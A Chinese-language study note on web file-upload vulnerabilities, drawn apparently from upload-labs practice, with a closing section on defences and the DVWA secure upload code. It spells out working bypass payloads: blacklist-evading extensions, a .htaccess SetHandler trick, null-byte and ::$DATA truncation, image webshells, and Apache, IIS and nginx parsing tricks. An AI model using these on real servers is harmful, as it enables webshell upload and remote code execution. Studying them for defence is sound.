[![sLJ441.png](https://s3.ax1x.com/2021/01/25/sLJ441.png)](https://imgchr.com/i/sLJ441)

### 19./.绕过

------

利用条件：黑名单过滤+move_uploaded_file()函数

------

主要代码

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
pathinfo(）函数：以数组的形式返回关于文件路径的信息。
pathinfo(path,options)
move_uploaded_file(A,B)函数：此函数将会检查文件A是否是合法的上传文件，如果是，将把文件A移动到B的目录下；否则将会返回false，并且不执行任何操作。
```

方法一：

由源码可得，最后图片的名字 $file_name 拼接而成，因此如果在中途将 $file_name 换掉，最开始 $file_name = upload-19.jpg，如果我们中途将他换成 upload-19.php +(二进制00截断)那么便可以以我们想要的格式执行

[![sLRnu4.png](https://s3.ax1x.com/2021/01/25/sLRnu4.png)](https://imgchr.com/i/sLRnu4)

方法二：

黑名单过滤+move_uploaded_file()函数

利用 move_uploaded_file会忽略掉文件末尾的`/.`

所以可以直接上传后缀为**.php/.** 的文件绕过

[![sLWeit.png](https://s3.ax1x.com/2021/01/25/sLWeit.png)](https://imgchr.com/i/sLWeit)

### 20.数组/.绕过

------

逻辑漏洞

------

主要代码

```
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```

逻辑漏洞，没有考虑数组第二个元素不存在的情况。

`$file_name`经过`reset($file) . '.' . $file[count($file) - 1];`处理

如果上传的是数组的话，会跳过`$file = explode('.', strtolower($file));`。 并且后缀有白名单过滤

而最终的文件名后缀取的是`$file[count($file) - 1]`，因此我们可以让`$file`为数组。 `$file[0]`为`shell.php/`，也就是`reset($file)`，然后再令`$file[2]`为白名单中的jpg。 此时`end($file)`等于jpg，`$file[count($file) - 1]`为空。 而 `$file_name = reset($file) . '.' . $file[count($file) - 1];`，也就是`shell.php/.`，最终`move_uploaded_file`会忽略掉`/.`，最终上传`smi1e.php`。

[![sLTFpR.png](https://s3.ax1x.com/2021/01/25/sLTFpR.png)](https://imgchr.com/i/sLTFpR)

## 文件解析漏洞

#### 1 Apache

1. Apache的解析规则为：从右至左依次尝试，直至识别

   `eg: 1.php.xxx`

2. 换行解析：2.4.0~2.4.29版本中的漏洞`1.php\0x0A`会被按照PHP进行解析

#### 2 IIS

1. 畸形目录解析（<=6.0）：`.asp`结尾的目录下面，被IIS当做网页解析`/xxxxx.asp/xxxxx.jpg`
2. 分号文件解析：IIS解析时忽略分号后面的部分`test.asp;.jpg`
3. 开启fast-cgi引起的畸形解析：在文件路径后面加上`/xx.php`会将原来的文件解析成php文件。`xxx.jpg/.php`或者`xxx.jpg/不存在.php`

#### 3 nginx

1. 在fast-cgi引起的畸形解析（和IIS一样）

2. 空字节代码执行：`xxx.jpg%00.php`

3. 文件名逻辑漏洞：`/test.jpg \0.php`*中间有空格*

4. 路径穿越（配置不当）：可以通过访问`/files../`的方式穿越路径

   ```
   //正确配置
   location /files/ {
     alias /home/;
   }
   //错误配置
   location /files{
     alias /home/;
   }
   ```

# 前言

本文主要总结文件上传漏洞。文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。

------

# 漏洞原理

文件上传漏洞非常常见，是web安全中经常利用的一种漏洞形式。我们经常可以见到在web应用程序中，许多都会允许上传图片、文本或者其他资源到指定的位置，文件上传漏洞就是通过利用这些可以上传的地方，将恶意代码植入到服务器中，再通过url去访问，从而执行代码来达到恶意攻击的目的。造成文件上传漏洞的原因有很多，比如对上传文件的后缀或扩展名没有做较为严格的限制，对于上传文件的`MIMETYPE`没有做检查，又或者没有限制对于上传的文件的文件权限，都有可能会导致文件上传漏洞。

------

# 漏洞常见类型

## 基于文件校验的漏洞

### 客户端检测

#### js前端验证

前端一般会用JS函数来验证上传文件的扩展名之类的操作，相比起安全措施，这更像是一种防止用户上传操作失误的措施，我们直接删除掉JS代码，或者使用burp一类的工具进行改包，就可以绕过这类验证。

### 服务端检测

#### 检查后缀/扩展名

对于在服务端进行扩展名检查的，一般分为两种：黑名单和白名单，其中后者相对更安全一点，不容易出现疏漏。

##### 黑名单

##### 寻找可解析后缀

利用burpsuite工具截断HTTP请求，利用intruder模块进行枚举后缀名，来寻找黑名单中是否存在没有过滤到的后缀名。

常见的可解析后缀名有：

```
".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini"
```

##### `.htaccess`

> .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
>
> 在apache中，如果需要启动.htaccess，必须在http.conf中设置AllowOverride为All。

如果我们上传一个`.htaccess`，其内容为：

```
SetHandler application/x-httpd-php
```

这样的话所有文件都会被解析为php。

注意由于直接创建txt文档会显示必须键入文件名，所以可以采用cmd命令方式来生成`.htaccess`。

##### 利用各类符号绕过后缀名

当这些后缀都被拉入黑名单时，我们可以考虑用大小写、双写、点号等方式来绕过。大小写、双写、结尾加空格等常规方式就不再赘述，主要说一下点绕过、`::$DATA`绕过、路径拼接绕过这些绕过方法。

###### 点绕过

windows系统下，后缀名的最后一个点会被自动删除掉，所以可以通过在结尾加一个点的方式绕过黑名单。

###### `::$DATA`绕过

> 是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 `a.asp` 本身的数据，如果a.asp 还包含了其他的数据流，比如 `a.asp:lake2.asp`，请求 `a.asp:lake2.asp::$DATA`，则是请求`a.asp`中的流数据`lake2.asp`的流数据内容。

因此我们在后缀名中添加`::$DATA`即可绕过。

注意要在Linux下修改文件名，因为在Windows下创建不了。

###### 路径拼接绕过

示例：

```
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

可以看到这里对文件名进行了处理，删除了文件名末尾的点，并且把处理过的文件名拼接到路径中。

这里我们就可以将文件名构造为 `1.php. .` （点+空格+点），这样在路径拼接之后，文件名就会变成`1.php`，从而成功绕过。

##### 白名单

##### MIME绕过

> MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当改扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开，多用于指定一些客户端自定义的文件夹，以及一些媒体文件打开方式。

我们来看一个示例：

```
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'];          
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
```

在这里我们检查`Content-type`，burp抓包修改其类型即可绕过。

`Content-type`常见类型见下：

| 文件类型           | Content-type                       |
| ------------------ | ---------------------------------- |
| 超文本标记语言文本 | .html,.html text/html              |
| 普通文本           | .txt text/plain                    |
| RTF文本            | .txt text/plain                    |
| GIF图形            | .gif image/gif                     |
| JPEG图形           | .jpeg,.jpg image/jpeg              |
| au声音文件         | .au audio/basic                    |
| MIDI音乐文件       | .mid,.midi audio/midi,audio/x-midi |
| RealAudio音乐文件  | .ra, .ram audio/x-pn-realaudio     |
| MPEG文件           | .mpg,.mpeg video/mpeg              |
| AVI文件            | .avi video/x-msvideo               |
| GZIP文件           | .gz application/x-gzip             |
| TAR文件            | .tar application/x-tar             |

##### 00截断

00截断是很常见的截断方法，原理是有些函数处理时，会把这个字符当作结束符。

```
截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态
```

如：1.php0x00.jpg

值得注意的是，在GET型00截断中，我们要使用`%00`来截断，因为GET型提交的内容会被自动进行URL解码；而在POST型00截断中，`%00`是不会被自动解码的，我们需要在16进制中对其进行修改，将其改为00即可截断。

#### 检查内容

##### 文件幻数/文件头检测

文件幻数是用来唯一标识文件类型的一系列数字（十六进制），也就是我们常说的文件头，当白名单限制了文件幻数时，我们就要给我们的文件制造可以过关的文件头：

```
.jpg	Value = FF D8 FF E0 
.gif	Value = 47 49 46 38
.png	Value = 89 50 4E 47
.html	Value = 68 74 6D 6C 3E 10
.xml	Value = 3C 3F 78 6D 6C
```

然后在文件幻数之后加上我们要的木马就好了。

##### 制作图片马

当服务端会对文件进行加载测试、渲染测试时，我们就可以将我们的代码注入到图片中，这样就不会破坏文件的格式，从而在白名单允许的图片格式范围内成功插入php代码，然后再利用文件包含来执行该代码。

一句话木马（webshell）中常用的危险函数有`eval()` 、 `assert()` 、 `preg_replace()` ：

![img](https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpupdate/1.png)

![img](https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpupdate/2.png)

制作方法：

![img](https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.3/php/phpupdate/3.png)

>  文件包含漏洞请见：https://jiulin.space/2021/01/02/php3/#more

## 基于文件处理的漏洞

### 条件竞争

当网站的文件上传的过程是：`服务器获取文件–>保存上传临时文件–>重命名移动临时文件` 这样的步骤时，

我们就可以使用条件竞争来进行绕过，通过不断地对文件进行上传和打开，从而使服务器还未重命名移动临时文件时，我们就利用时间差打开了文件，成功执行其中的php代码。

具体方法：我们可以利用burp不断发包来进行条件竞争，也可以通过python脚本来反复发送请求得到结果。

### 二次渲染

> 二次渲染，相当于把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染。在该过程中，非图像数据的部分与图像数据会被隔离开。

方法也很简单，我们在十六进制中寻找二次渲染并未改变的部分，在其中插入php代码就好了。

## 基于文件解析的漏洞

### IIS篇

#### ；截断

当文件名为abc.asp;xx.jpg时，IIS6会将此文件解析成abc.asp，文件名被截断了，从而导致脚本被执行。

#### 处理文件夹拓展名出错

在IIS6.0的网站目录中创建有*.asp形式的目录，该文件夹下的所有文件都会以asp脚本格式进行解析。

##### WebDav漏洞

WebDav是一种基于HTTP1.1协议的通信协议。在GET、POST、HEAD等HTTP标准方法之外扩展了新方法。

攻击者可以通过PUT方法向服务器上传危险脚本。

### NGINX篇

##### php配置错误导致的解析漏洞

我们用一个test.jpg（其内容为一句话木马）来构造payload：

```
http://127.0.0.1/test.jpg/test.php
```

Nginx在拿到/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了。

原理是，当打开php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。之后，php就对文件路径进行”修理“，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。

新版本的php引入了“security.limit_extensions”，限制了可执行文件的后缀，默认只允许执行.php文件。我们可以考虑修改该文件中的“security.limit_extensions”，添加上.jpg，这样php就认为.jpg也是合法的php文件了。

### APACHE篇

#### 多后缀名

Apache认为一个文件可以有多个后缀，如：example.php.abc，Apache会从右往左辨别后缀，一开始看到这个abc，不认识所以读到了php, 就把我们输入的这个文件当作了php文件，不再继续往下读。

#### 换行解析漏洞

此漏洞的出现是由于apache在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析php时`xxx.php\x0A`将被按照php后缀进行解析，导致绕过一些服务器的安全策略。

用法是在用burp抓包后在例如`1.php`后插入以一个`\x0A`绕过黑名单过滤，访问`1.php%0A`，即可看到文件被当作php解析。

此外，文件上传漏洞也经常用于和文件包含漏洞打”组合拳“，也就是先上传恶意代码，再包含上传文件。

------

# 文件上传漏洞防御思路

> 引自：[美创安全实验室](http://smallwolf.top/2020/11/27/文件上传漏洞学习总结/[文件上传漏洞攻击与防范方法_m0_38103658的博客-CSDN博客_文件上传漏洞](https://blog.csdn.net/m0_38103658/article/details/100162185?ops_request_misc={"request_id":"160630266919725271621661","scm":"20140713.130102334.."}&request_id=160630266919725271621661&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-5-100162185.pc_first_rank_v2_rank_v28&utm_term=文件上传漏洞&spm=1018.2118.3001.4449))

## 系统运行时的防御

1. 文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。
2. 判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文
   件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。
3. 使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。
4. 单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。
5. 使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。

## 系统开发阶段的防御

1. 系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。
2. 对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。

## 系统维护阶段的防御

1. 系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。
2. 定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。
3. 对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。

## 防护代码参考

> 引自DVWA中impossible源码

```
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );


    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Where are we going to be writing to?
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );
            imagejpeg( $img, $temp_file, 100);
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );

        // Can we move the file to the web root from the temp folder?
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
            // Yes!
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
        }
        else {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }

        // Delete any temp files
        if( file_exists( $temp_file ) )
            unlink( $temp_file );
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>

//1. strtolower()函数，对字符串进行小写操作，防止了用大小写绕过
//2. uniqid()函数，基于以微秒计的当前时间，生成一个唯一的ID
//3. $target_file = md5( uniqid() . $uploaded_name ) . ‘.’ . $uploaded_ext;：对上传的文件进行了重命名，为md5值，导致00截断无法绕过过滤规则
//4. 通过imagecreatefromjpeg()和imagecreatefrompng()函数将上传的图片文件重新写入到一个新的图片文件中，这两个函数会自动将图片中的有害元数据抹除，因此即使黑客上传了一张图片马也会被这个函数过滤成一个纯正的图片。
//5. imagedestroy( $img )将用户上传的源文件删除
//6. unlink( $temp_file )删除过滤过程中产生的任何临时文件
```

---

## 相关资源

- **靶场WP**: [ctfshow-文件上传WP](WP汇总/ctfshow-文件上传wp.md) | [upload-labs WP](WP汇总/文件上传/README.md)
- **组合利用**: [文件包含.md](文件包含.md) — 文件上传+文件包含组合GetShell (L1293-L1408)
- **代码审计**: [php代码审计.md](php代码审计.md) — move_uploaded_file %00截断 (L1414)
- **工具**: [ffuf模糊测试](工具使用/ffuf的使用.md) | [Dirsearch目录扫描](工具使用/Dirsearch.md)